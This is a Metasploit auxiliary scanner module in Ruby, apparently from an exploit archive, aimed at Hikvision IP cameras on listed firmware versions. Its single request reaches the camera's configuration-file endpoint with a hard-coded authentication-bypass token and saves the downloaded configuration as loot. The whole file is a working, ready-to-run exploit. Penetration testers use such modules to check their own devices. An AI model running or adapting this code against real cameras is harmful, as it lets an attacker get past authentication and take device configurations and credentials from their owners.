# Author: Alfie
# Website: https://www.hikvision.com/en/
# Software: Hikvision Camera
# Versions: 
# DS-2CD2xx2F-I Series: V5.2.0 build 140721 to V5.4.0 build 160530
# DS-2CD2xx0F-I Series: V5.2.0 build 140721 to V5.4.0 Build 160401
# DS-2CD2xx2FWD Series: V5.3.1 build 150410 to V5.4.4 Build 161125
# DS-2CD4x2xFWD Series: V5.2.0 build 140721 to V5.4.0 Build 160414
# DS-2CD4xx5 Series: V5.2.0 build 140721 to V5.4.0 Build 160421
# DS-2DFx Series: V5.2.0 build 140805 to V5.4.5 Build 160928
# DS-2CD63xx Series: V5.0.9 build 140305 to V5.3.5 Build 160106
 
##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##
 
class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::HttpClient
  include Msf::Auxiliary::Report
  include Msf::Auxiliary::Scanner
 
  def initialize(info = {})
    super(update_info(info,
      &#039;Name&#039;           => &#039;Configuration download in Hikvision IP Cameras&#039;,
      &#039;Description&#039;    => %q{
      },
      &#039;License&#039;        => MSF_LICENSE,
      &#039;Author&#039;         => 
        [
          &#039;Monte Crypto&#039;, # Vulnerability discovery
          &#039;Alfie Njeru&#039; # Metasploit module
        ],
      &#039;References&#039;     =>
        [
          [ &#039;URL&#039;, &#039;https://packetstormsecurity.com/files/144097/Hikvision-IP-Camera-Access-Bypass.html&#039; ],
         
          [ &#039;URL&#039;, &#039;http://seclists.org/fulldisclosure/2017/Sep/23&#039; ]
        ]
    ))
 
    register_options(
      [
        Opt::RPORT(80),
        OptString.new(&#039;TARGETURI&#039;, [true, &#039;Path to the path that config is stored &#039;, &#039;/System/configurationFile?auth=YWRtaW46MTEK&#039;])
      ])
  end
 
  def run_host(ip)
 
    print_status("#{rhost}:#{rport} - Sending request...")
    uri = normalize_uri(target_uri.path)
    res = send_request_cgi({
      &#039;uri&#039;          => uri,
      &#039;method&#039;       => &#039;GET&#039;,
    })
 
    if res and res.code == 200
      contents = res.body
      fname = File.basename(datastore[&#039;TARGETURI&#039;])
      path = store_loot(
        &#039;usersvision &#039;,
        &#039;text/plain&#039;,
        ip,
        contents,
        fname
      )
      print_status("#{rhost}:#{rport} - File saved in: #{path}")
    else
      print_error("#{rhost}:#{rport} - Failed to retrieve file")
      return
    end
  end
end

